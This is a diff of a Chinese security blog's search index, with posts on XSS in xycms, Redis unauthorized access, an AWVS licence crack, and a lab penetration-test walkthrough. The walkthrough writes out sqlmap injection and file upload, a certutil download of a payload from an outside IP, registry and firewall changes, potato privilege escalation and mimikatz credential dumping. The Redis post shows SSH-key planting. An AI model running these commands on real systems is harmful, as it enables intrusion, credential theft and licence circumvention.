@@ -182,13 +182,16 @@
 <p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803203050491.png" alt="image-20220803203050491"></p>
 <p><img src="/2022/07/29/xssplatfrom%E3%80%81bluelotus%E4%BD%BF%E7%94%A8/image-20220803202642369.png" alt="image-20220803202642369"></p>
 ]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
   </entry>
   <entry>
     <title>xycmsV3.6-xss漏洞</title>
     <url>/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h3 id="搭建xycms"><a href="#搭建xycms" class="headerlink" title="搭建xycms"></a>搭建xycms</h3><p>1、将uploads_code文件夹下的内容放至根目录</p>
 <p>2、访问<a href="http://localhost/install/%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7xyhcms">http://localhost/install/进行安装「默认账号xyhcms</a> 密码安装时自定义 」</p>
-<p>3、安装完成后为了保证数据安全，务必删除install目录</p>
+<p>3、安装完成后为了保证数据安全，务必删除install目录<span id="more"></span></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在新闻中心找一篇文章评论，管理员审核后返回管理员cookie</p>
 <p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803211212164.png" alt="image-20220803211212164"></p>
 <p>假装管理员访问后台：<a href="http://192.168.2.142:8001/xyhai.php?s=/Login/index">http://192.168.2.142:8001/xyhai.php?s=/Login/index</a>   「xyhcms&#x2F;123456」</p>
@@ -214,9 +217,9 @@
   <entry>
     <title>搭建redis-redis未授权访问</title>
     <url>/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
-    <content><![CDATA[<h4 id="redis-server搭建"><a href="#redis-server搭建" class="headerlink" title="redis-server搭建"></a>redis-server搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">关闭客户端：redis-cli shutdown</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h4 id="redis搭建「linux」"><a href="#redis搭建「linux」" class="headerlink" title="redis搭建「linux」"></a>redis搭建「linux」<span id="more"></span></h4><h5 id="server"><a href="#server" class="headerlink" title="server"></a>server</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">关闭客户端：redis-cli shutdown</span><br></pre></td></tr></table></figure>
 
-<h4 id="攻击机安装redis-cli远程连接工具"><a href="#攻击机安装redis-cli远程连接工具" class="headerlink" title="攻击机安装redis-cli远程连接工具"></a>攻击机安装redis-cli远程连接工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make </span><br><span class="line">cp src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>
+<h5 id="攻击机安装redis-cli远程连接工具"><a href="#攻击机安装redis-cli远程连接工具" class="headerlink" title="攻击机安装redis-cli远程连接工具"></a>攻击机安装redis-cli远程连接工具</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make </span><br><span class="line">cp src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>
 
 <h5 id="服务端启动redis-server"><a href="#服务端启动redis-server" class="headerlink" title="服务端启动redis-server"></a>服务端启动redis-server</h5><p>修改redis.conf 添加：protected-mode no「关闭保护模式 protected-mode no 否则外部IP无法连接」</p>
 <img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727131302567.png" alt="image-20220727131302567" style="zoom:50%;">
@@ -228,12 +231,19 @@
 <p>redis内获取当前目录：config get dir</p>
 <img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727132219438.png" alt="image-20220727132219438" style="zoom:33%;">
 
+<h3 id="redis搭建「windows」"><a href="#redis搭建「windows」" class="headerlink" title="redis搭建「windows」"></a>redis搭建「windows」</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/microsoftarchive/redis/releases</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli：redis.cli.exe -h 172.16.200.130</span><br><span class="line">启动redis-server：redis-server.exe redis.windows.conf</span><br></pre></td></tr></table></figure>
+
+<h3 id="未授权访redis「比武例题」"><a href="#未授权访redis「比武例题」" class="headerlink" title="未授权访redis「比武例题」"></a>未授权访redis「比武例题」</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*config get dir</span><br><span class="line">*config set dir /home/ubt/.ssh</span><br><span class="line">*config sert dbfilename authorized_keys</span><br><span class="line">拷贝/.ssh下的id_rsa.pub</span><br><span class="line">*set x &quot;\n\n\n********\n\n\n&quot;</span><br><span class="line">*save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220806121400255.png" alt="image-20220806121400255"></p>
 <h3 id="利用gopher协议未授权访问redis"><a href="#利用gopher协议未授权访问redis" class="headerlink" title="利用gopher协议未授权访问redis"></a>利用gopher协议未授权访问redis</h3><p>利用ssrf漏洞，使用dict:&#x2F;&#x2F;可以探测是否开启6379服务</p>
 <p><a href="http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379">http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379</a></p>
 <p>一、在攻击机上生成公私钥，密码设置为空</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
-<p>二、进入&#x2F;root&#x2F;.ssh目录，将生成的公钥保存到1.txt</p>
+<p>二、攻击机进入&#x2F;root&#x2F;.ssh目录，将生成的公钥保存到1.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>
 
 <p>三、把1.txt内容通过Python脚本写入公钥 转化为gopher协议格式</p>
@@ -261,7 +271,7 @@
     <title>漏扫工具使用</title>
     <url>/2022/07/29/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="aWVS"><a href="#aWVS" class="headerlink" title="aWVS"></a>aWVS</h2><p>arl-awvs.py:联合arl灯塔进行扫描</p>
-<p>用户名密码：<a href="mailto:&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;">&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;</a>&#x2F;<a href="mailto:&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>用户名密码：<a href="mailto:&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;">&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;</a>&#x2F;<a href="mailto:&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;">&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;</a></p>
 <h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker search awvs</span><br><span class="line">sudo docker pull xrsec/awvs</span><br><span class="line">docker run -it -d --name awvs -p 3445:3443 --restart=always xrsec/awvs:latest</span><br></pre></td></tr></table></figure>
 
 <h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制license_info.json&amp;wa_data.dat---&gt;</span><br><span class="line">windows&gt;&gt;&gt;C:/PrpgramData/Acunetix/shared/license/</span><br><span class="line">linux&gt;&gt;&gt;/home/acunetix/.acunetix/data/license/</span><br><span class="line">mac&gt;&gt;&gt;/Applications/Acunetix.app/Contents/Resources/data/license</span><br><span class="line"></span><br><span class="line">docker&gt;&gt;&gt;docker cp license_info.json&amp;wa_data.dat---&gt; doker-id:/home/acunetix/.acunetix/data/license</span><br><span class="line"></span><br><span class="line">修改hosts文件：</span><br><span class="line">windows：C:\Windows\System32\drivers\etc</span><br><span class="line">linux:/etc/hosts</span><br><span class="line">追加：</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>
@@ -298,5 +308,134 @@
       <categories>
         <category>工具</category>
       </categories>
+  </entry>
+  <entry>
+    <title>CS和MSF联动</title>
+    <url>/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/</url>
+    <content><![CDATA[<p>Cobaltstrike简介：提权、凭据导出、端口转发、socket代理、office攻击、钓鱼等功能<span id="more"></span></p>
+<p><strong>服务端启动：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver ip 密码     #一般在linux或vps上搭建服务端</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端启动：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux: ./start.sh</span><br><span class="line">windows: start.bat或Cobaltstrike.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="一、实现Cobalt-Strike与MSF的联动"><a href="#一、实现Cobalt-Strike与MSF的联动" class="headerlink" title="一、实现Cobalt Strike与MSF的联动"></a>一、实现Cobalt Strike与MSF的联动</h3><h3 id="二、自主搭建带有内网环境靶机，实现上线不出网主机"><a href="#二、自主搭建带有内网环境靶机，实现上线不出网主机" class="headerlink" title="二、自主搭建带有内网环境靶机，实现上线不出网主机"></a>二、自主搭建带有内网环境靶机，实现上线不出网主机</h3>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>某次实战考核</title>
+    <url>/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/</url>
+    <content><![CDATA[<p>已知：连接vpn访问192.163.3.56<span id="more"></span></p>
+<h4 id="1、后台端口号是？"><a href="#1、后台端口号是？" class="headerlink" title="1、后台端口号是？"></a>1、后台端口号是？</h4><p>8080<br>nmap扫描端口：nmap -sS 192.163.3.56<br>开放80和8080两个http 试一试8080成功跳转后台</p>
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122524910.png" alt="image-20220818122524910" style="zoom:50%;">
+
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818122656681.png" alt="image-20220818122656681" style="zoom:50%;">
+
+<h4 id="2、后台密码是？"><a href="#2、后台密码是？" class="headerlink" title="2、后台密码是？"></a>2、后台密码是？</h4><p>123456<br>尝试bp弱口令爆破、万能密码均失败「是被老六改密码了」 后面环境还原：admin&#x2F;123456 一猜就出</p>
+<img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818123007180.png" alt="image-20220818123007180" style="zoom:50%;">
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144145174.png" alt="image-20220818144145174"></p>
+<h4 id="3、当前数据库名字是"><a href="#3、当前数据库名字是" class="headerlink" title="3、当前数据库名字是"></a>3、当前数据库名字是</h4><p>RYPlatformManagerDB<br>先想办法getshell或sql注入<br>使用xray扫描管理员登录界面：.&#x2F;xray_darwin_amd64 webscan –listen 127.0.0.1:7777 –html-output 1.html<br>发现userName处存在sql注入 管理员登录页面抓包跑sqlmap 布尔盲注</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818182614046.png" alt="image-20220818182614046"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818163328199.png" alt="image-20220818163328199"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164507860.png" alt="image-20220818164507860">sqlmap -r 1.txt –current-db 跑出当前数据库：RYPlatformManagerDB</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818164350964.png" alt="image-20220818164350964"></p>
+<h4 id="4、后台用户数为？"><a href="#4、后台用户数为？" class="headerlink" title="4、后台用户数为？"></a>4、后台用户数为？</h4><p>3<br>23个又提交错误「22个也错 最后一个应该是其他学员教的」 后面数据库再看吧 后面看来看去不对 仔细理解题目 后台用户数不会指的就是能登进后台的人吧？3个？ 果然是！</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144436579.png" alt="image-20220818144436579"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818145524551.png" alt="image-20220818145524551"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818201341674.png" alt="image-20220818201341674"></p>
+<h4 id="5、管理员登录IP是？"><a href="#5、管理员登录IP是？" class="headerlink" title="5、管理员登录IP是？"></a>5、管理员登录IP是？</h4><p>182.241.240.216<br>一开始以为是这个172.30.0.46 提交发现错误</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818144325664.png" alt="image-20220818144325664"></p>
+<p>进网站系统-后台管理 发现其他两个的代理和管理员的ip都是同一个 猜测本admin也是这个ip bingo！</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818194719498.png" alt="image-20220818194719498"></p>
+<p>由于数据库内容太多 所以还是getshell来看比较方便：–os-shell<br>可知服务器为windows</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818190648304.png" alt="image-20220818190648304"></p>
+<h4 id="6、运维人员的后台登录密码是？"><a href="#6、运维人员的后台登录密码是？" class="headerlink" title="6、运维人员的后台登录密码是？"></a>6、运维人员的后台登录密码是？</h4><p>111111<br>已知管理层有amdin、maoyule1、A00068，运维可能是maoyule1<br>我尝试自己新建了一个超级管理员：admin111&#x2F;123123 从图片可以看出*号密码并不代表位数 不能从位数看maoyule1的密码</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195320105.png" alt="image-20220818195320105"></p>
+<p>从后台日志可以看出一开始都是maoyule1在操作，所以他应该是运维无疑</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195505981.png" alt="image-20220818195505981"></p>
+<p>他确实在操作后台 那么可以尝试bp爆破了 又是123456 但是提交显示错误？？</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195617553.png" alt="image-20220818195617553"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818195811528.png" alt="image-20220818195811528"></p>
+<p>难道运维是A00068吗？我又bp了一下 A00068&#x2F;111111 结果真对了……毫无逻辑</p>
+<h4 id="7、数据库用户-sa-的密码是？"><a href="#7、数据库用户-sa-的密码是？" class="headerlink" title="7、数据库用户 sa 的密码是？"></a>7、数据库用户 sa 的密码是？</h4><p>c0FI888SW7hwc0S9Rfb3L2BVPePOD</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">信息收集：</span><br><span class="line">whoami:nt service\mssqlserver</span><br><span class="line">不存在nc.exe wget ping 但有certutil</span><br></pre></td></tr></table></figure>
+
+<p>新建用户但是权限不够</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818214811692.png" alt="image-20220818214811692"></p>
+<p>使用–password命令获取所有曾连接过数据库所有账号的密码：此处行不通<br>打算上传nc.exe用来反弹shell 实在是因为盲注太慢了 先弹回来再说 但这边好像写入失败 似乎是没有写文件的权限？「后面之道是路径写错了」</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --file-write=/Users/chendafa/Desktop/nc.exe --file-dest=C:\\windows\\system32\\nc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210018564.png" alt="image-20220818210018564"></p>
+<p>重新尝试直接开3389吧 一开始3389是关的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否开了3389：netstat -an | find &quot;3389&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210342095.png" alt="image-20220818210342095"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启3389：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>开启失败 可能是因为防火墙没关 后面也没关成功</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818210615771.png" alt="image-20220818210615771"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关闭防火墙：netsh firewall set opmode disable </span><br></pre></td></tr></table></figure>
+
+<p>换思路：本机开启cs 建立监听器「ip用vpn分配给本机的地址」 生成马 通过sqlmap上传文件运行 直接上线<br>尝试过certutile方法下载vps上的马 额好像不出网？</p>
+<p>另一种方式：potato系列 在盲注阶段直接提权，写文件至web路径「但是这个盲注阶段web路径你要找的话太费时间了」</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://103.170.73.80/jojo.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818213537945.png" alt="image-20220818213537945"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819121849432.png" alt="image-20220819121849432"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --file-write=/Users/chendafa/Downloads/jojo.exe --file-dest=C:/windows/temp/jojo.exe</span><br></pre></td></tr></table></figure>
+
+<p>这次好像成功上传 因为返回了文件大小 之前失败大概是路径的反斜杠问题 但还是执行不了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818215550416.png" alt="image-20220818215550416"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --os-cmd=C:/windows/temp/m2.exe</span><br></pre></td></tr></table></figure>
+
+<p>到执行这一步就一直卡在这 cs也没上线「后面知道cs的监听地址弄错了 应该是vpn分配给本机的172……还有后面那个windows的路径要用正斜杠」</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220818222026406.png" alt="image-20220818222026406"></p>
+<p>终于成功上线！！！就疯狂注入进程 防止掉线</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819122858626.png" alt="image-20220819122858626"></p>
+<p>至于sa的密码 cs上线之后可以到他web目录下去看数据库配置文件 此前监听的时候出现过一个地址 应该就是web路径<br>前人栽树后人乘凉 这里我就不骑马了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124919347.png" alt="image-20220819124919347"></p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124820887.png" alt="image-20220819124820887"></p>
+<p>下载下来一看可不就是有密码了吗</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125106154.png" alt="image-20220819125106154"></p>
+<h4 id="8、用户administrator桌面上的flag-txt-文件中的内容是？"><a href="#8、用户administrator桌面上的flag-txt-文件中的内容是？" class="headerlink" title="8、用户administrator桌面上的flag.txt 文件中的内容是？"></a>8、用户administrator桌面上的flag.txt 文件中的内容是？</h4><p>flag{DeSkt0pflAg34*}</p>
+<p>尝试访问administrator的桌面文件，提示没有权限，所以尝试提权 potato系列 提权成功获取system权限</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123508429.png" alt="image-20220819123508429"></p>
+<p>提权成功后就可以进administrator用户的桌面了</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819124231390.png" alt="image-20220819124231390"></p>
+<h4 id="9、服务器密码是？"><a href="#9、服务器密码是？" class="headerlink" title="9、服务器密码是？"></a>9、服务器密码是？</h4><p>!@#123qwe</p>
+<p>run mimikatz 成功获取服务器明文密码</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819123822165.png" alt="image-20220819123822165"></p>
+<h4 id="10、修改过的RDP端口是？"><a href="#10、修改过的RDP端口是？" class="headerlink" title="10、修改过的RDP端口是？"></a>10、修改过的RDP端口是？</h4><p>3940</p>
+<p><img src="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/image-20220819125404863.png" alt="image-20220819125404863"></p>
+]]></content>
+      <tags>
+        <tag>实战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_web_writeup</title>
+    <url>/2022/12/09/bugku-web-writeup/</url>
+    <content><![CDATA[<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>post框提交what&#x3D;flag</p>
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>?num&#x3D;1a</p>
+<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>右键查看源代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;#<span class="number">102</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">103</span>;&amp;#<span class="number">123</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">51</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">57</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">125</span>; --&gt;&lt;/script&gt;  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python3：</span><br><span class="line">import html</span><br><span class="line"><span class="keyword">print</span> (html.<span class="title function_ invoke__">unescape</span>(<span class="string">&#x27;XX&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p><img src="/2022/12/09/bugku-web-writeup/image-20221209181056866.png" alt="image-20221209181056866"></p>
+<p>连续点击几次，14.jpg那边会随机变，直到跳出flag</p>
+<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>访问shell.php，密码bp爆破是hack</p>
+<h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>在request头加：X-Forwarded-For：127.0.0.1<br>使用admin&#x2F;test123登录获取flag「密码bp爆破」</p>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2>]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
 </search>
